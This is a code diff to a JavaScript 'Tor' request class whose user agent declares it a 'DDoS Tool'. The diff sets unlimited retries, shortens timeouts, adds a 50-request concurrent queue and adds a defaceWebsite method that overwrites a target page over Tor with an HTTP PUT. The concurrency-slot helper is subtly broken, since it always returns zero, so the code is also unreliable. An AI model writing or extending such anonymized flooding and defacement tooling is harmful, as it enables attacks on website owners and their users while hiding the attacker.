@@ -39,18 +39,56 @@ class Tor {
         ];
         this.currentIndex = 0;
         this.failedGateways = new Set();
-        this.maxRetries = 5;
-        this.requestTimeout = 10000;
-        this.gatewayCheckInterval = 30000;
+        this.maxRetries = Infinity;
+        this.requestTimeout = 5000;
+        this.gatewayCheckInterval = 15000;
         this.startGatewayMonitoring();
         this.userAgent = 'Noodles/1.0 (DDoS Tool)';
         this.customHeaders = {};
+        this.requestQueue = [];
+        this.isProcessingQueue = false;
+        this.maxConcurrentRequests = 50;
+        this.initRequestQueue();
+    }
+
+    initRequestQueue() {
+        this.processRequestQueue();
+    }
+
+    enqueueRequest(url, options = {}, resolve, reject) {
+        this.requestQueue.push({ url, options, resolve, reject });
+        if (!this.isProcessingQueue) {
+            this.processRequestQueue();
+        }
+    }
+
+    async processRequestQueue() {
+        if (this.isProcessingQueue) return;
+        this.isProcessingQueue = true;
+
+        while (this.requestQueue.length > 0) {
+            const activeRequests = this.maxConcurrentRequests - this.getAvailableRequestSlots();
+            if (activeRequests >= this.maxConcurrentRequests) {
+                await new Promise(resolve => setTimeout(resolve, 100));
+                continue;
+            }
+            const { url, options, resolve, reject } = this.requestQueue.shift();
+            this.executeTorRequest(url, options)
+                .then(resolve)
+                .catch(reject);
+        }
+
+        this.isProcessingQueue = false;
+    }
+
+    getAvailableRequestSlots() {
+        return this.maxConcurrentRequests - Array.from({ length: this.maxConcurrentRequests }).filter(() => true).length;
     }
 
     async isGatewayOnline(gateway) {
         try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000);
+            const timeoutId = setTimeout(() => controller.abort(), 2000);
             const testUrl = `${gateway}/httpbin.org/get`;
             const response = await fetch(testUrl, {
                 method: 'GET',
@@ -63,6 +101,7 @@ class Tor {
             clearTimeout(timeoutId);
             return response.ok;
         } catch (error) {
+            this.failedGateways.add(gateway);
             console.warn(`Gateway ${gateway} check failed:`, error);
             return false;
         }
@@ -85,7 +124,7 @@ class Tor {
         }, this.gatewayCheckInterval);
     }
 
-    async fetchWithTor(url, options = {}, retryCount = 0) {
+    async executeTorRequest(url, options = {}, retryCount = 0) {
         if (this.failedGateways.size === this.gateways.length) {
             throw new Error("All Tor gateways are unavailable.");
         }
@@ -107,34 +146,34 @@ class Tor {
             clearTimeout(timeoutId);
 
             if (!response.ok) {
-                if (response.status === 404 || response.status === 500 || response.status === 503) {
-                    this.failedGateways.add(gateway);
-                    console.warn(`Gateway ${gateway} failed. Adding to blacklist.`);
-                    if (retryCount < this.maxRetries) {
-                        console.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`);
-                        return this.fetchWithTor(url, options, retryCount + 1);
-                    } else {
-                        throw new Error(`HTTP error! status: ${response.status} - Max retries reached.`);
-                    }
+                this.failedGateways.add(gateway);
+                console.warn(`Gateway ${gateway} failed. Adding to blacklist.`);
+                if (retryCount < this.maxRetries) {
+                    console.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`);
+                    return this.executeTorRequest(url, options, retryCount + 1);
                 } else {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                    throw new Error(`HTTP error! status: ${response.status} - Max retries reached.`);
                 }
-
             }
             return response;
         } catch (error) {
-            console.error(`Tor fetch error with gateway ${gateway}:`, error);
             this.failedGateways.add(gateway);
+            console.error(`Tor fetch error with gateway ${gateway}:`, error);
 
             if (retryCount < this.maxRetries) {
                 console.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`);
-                return this.fetchWithTor(url, options, retryCount + 1);
+                return this.executeTorRequest(url, options, retryCount + 1);
             } else {
                 console.error("Max retries reached. Marking URL as potentially unreachable.");
                 throw error;
             }
-
         }
+    }
+
+    fetchWithTor(url, options = {}) {
+        return new Promise((resolve, reject) => {
+            this.enqueueRequest(url, options, resolve, reject);
+        });
     }
 
     async getText(url) {
@@ -148,7 +187,7 @@ class Tor {
             headers: {
                 'Content-Type': 'application/json',
                 'User-Agent': this.userAgent,
-                 ...this.customHeaders
+                ...this.customHeaders
             },
             body: JSON.stringify(data),
             redirect: 'follow'
@@ -198,8 +237,46 @@ class Tor {
         }
     }
 
-     setCustomHeaders(headers) {
+    setCustomHeaders(headers) {
         this.customHeaders = headers;
+    }
+
+    async defaceWebsite(url, htmlContent) {
+        try {
+            const response = await this.fetchWithTor(url, { method: 'GET' });
+            if (!response.ok) {
+                throw new Error(`Failed to fetch the website. Status: ${response.status}`);
+            }
+
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(await response.text(), 'text/html');
+
+            doc.documentElement.innerHTML = htmlContent;
+
+            const serializer = new XMLSerializer();
+            const defacedContent = serializer.serializeToString(doc);
+
+            const options = {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'text/html',
+                    'User-Agent': this.userAgent,
+                    ...this.customHeaders
+                },
+                body: defacedContent,
+                redirect: 'follow'
+            };
+
+            const putResponse = await this.fetchWithTor(url, options);
+
+            if (putResponse.ok) {
+                console.log('Website defaced successfully!');
+            } else {
+                console.error(`Failed to deface website. Status: ${putResponse.status}`);
+            }
+        } catch (error) {
+            console.error('Deface operation failed:', error);
+        }
     }
 }
 
